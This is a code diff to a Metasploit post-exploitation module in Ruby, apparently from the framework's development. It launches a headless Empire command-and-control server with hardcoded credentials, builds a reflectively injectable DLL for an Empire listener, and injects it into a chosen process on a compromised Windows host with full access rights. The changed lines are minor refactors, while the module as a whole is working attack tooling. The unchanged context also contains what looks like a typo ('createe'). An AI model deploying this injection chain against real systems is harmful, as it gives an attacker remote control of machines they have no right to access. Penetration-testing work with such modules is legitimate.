@@ -29,21 +29,24 @@ class MetasploitModule < Msf::Post
   def run
     #Storing user inputs.
     path = datastore['PathToEmpire'].to_s.chomp
-    port = datastore['LPORT'].to_s
-    pid = datastore['PID'].to_i
+    @port = datastore['LPORT'].to_s
+    @pid = datastore['PID'].to_i
 
     #Changing the working directory to the provided path
     Dir.chdir(path)
 
     #method to initiate the web-API
     def initiate_API
+      command = 'netstat -nlt|grep 1337'
+      value = system(command)
+      raise "Port 1337 already in use." if value
       command = "./empire --headless --username 'empire-msf' --password 'empire-msf' > /dev/null"
       value = system(command)
     end
 
     #method to create the reflectivly injectable DLL
     def create_DLL
-      generate_reflective_DLL('Listener_Emp',port)
+      generate_reflective_DLL('Listener_Emp',@port)
     end
 
     #main function
@@ -51,7 +54,7 @@ class MetasploitModule < Msf::Post
 
       #Setting up Empire
       print_status("Initiating the Empire Web-API instance. Might take few moments")
-      sleep(15)
+      sleep(17)
       print_status("Creating empire instance")
       client_emp = Msf::Empire::Client.new('empire-msf','empire-msf')
       print_status("Creating reflectively injectable DLL")
@@ -60,8 +63,8 @@ class MetasploitModule < Msf::Post
       payload_path = '/tmp/launcher-emp.dll'
 
       #Injecting the created DLL payload reflectively in provided process
-      host_process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
-      print_status("Injecting #{payload_path} into #{pid}")
+      host_process = client.sys.process.open(@pid, PROCESS_ALL_ACCESS)
+      print_status("Injecting #{payload_path} into #{@pid}")
       dll_mem, offset = inject_dll_into_process(host_process, payload_path)
       print_status("DLL Injected. Executing Reflective loader")
       host_process.thread.createe(dll_mem + offset, 0)
